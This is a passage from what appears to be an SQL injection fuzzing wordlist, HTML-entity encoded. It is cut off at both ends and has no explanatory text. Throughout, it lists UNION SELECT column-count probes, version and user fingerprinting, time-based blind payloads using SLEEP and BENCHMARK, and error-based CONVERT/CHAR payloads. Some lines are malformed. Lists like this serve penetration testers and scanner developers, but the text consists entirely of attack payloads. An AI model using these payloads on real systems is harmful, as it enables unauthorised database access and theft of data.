1,2,3,4,5,6,7,8,9,10,11,12,13-- \nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14-- \nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- \nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- \nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- \nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- \nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- \nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- \nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- \nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- \nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- \nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- \nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- \nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- \nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- \nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- \nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- \nUNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- \nUNION SELECT @@VERSION,SLEEP(5),3\nUNION SELECT @@VERSION,SLEEP(5),USER(),4\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30\nUNION SELECT @@VERSION,SLEEP(5),&quot;&#39;3\nUNION SELECT @@VERSION,SLEEP(5),&quot;&#39;3&#39;&quot;#\nUNION SELECT @@VERSION,SLEEP(5),USER(),4#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#\nUNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#\nUNION ALL SELECT USER()-- \nUNION ALL SELECT SLEEP(5)-- \nUNION ALL SELECT USER(),SLEEP(5)-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5)-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;))-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \nUNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \nUNION ALL SELECT NULL-- \nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(88)))-- \nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))-- \nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))-- \nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- \nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- \nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- \nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))-- \nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))-- \nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))-- \nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))-- \nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))-- \nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))-- \nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))-- \nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))-- \nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))-- \nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))-- \nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))-- \nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))-- \nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))-- \nUNION ALL SELECT NULL#\nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(88)))#\nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#\nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))#\nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#\nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#\nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#\nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))#\nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))#\nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))#\nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))#\nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))#\nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#\nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))#\nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))#\nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))#\nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))#\nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))#\nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))#\nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))#\nUNION ALL SELECT NULL \nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(88)))\nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))\nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))\nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))\nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))\nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))\nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))\nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))\nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))\nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))\nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))\nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))\nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))\nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))\nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))\nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))\nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))\nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))\nAND 5650&#x3D;CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))\nAND 5650&#x3D;CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650&#x3D;5650) THEN CHAR(49) ELSE 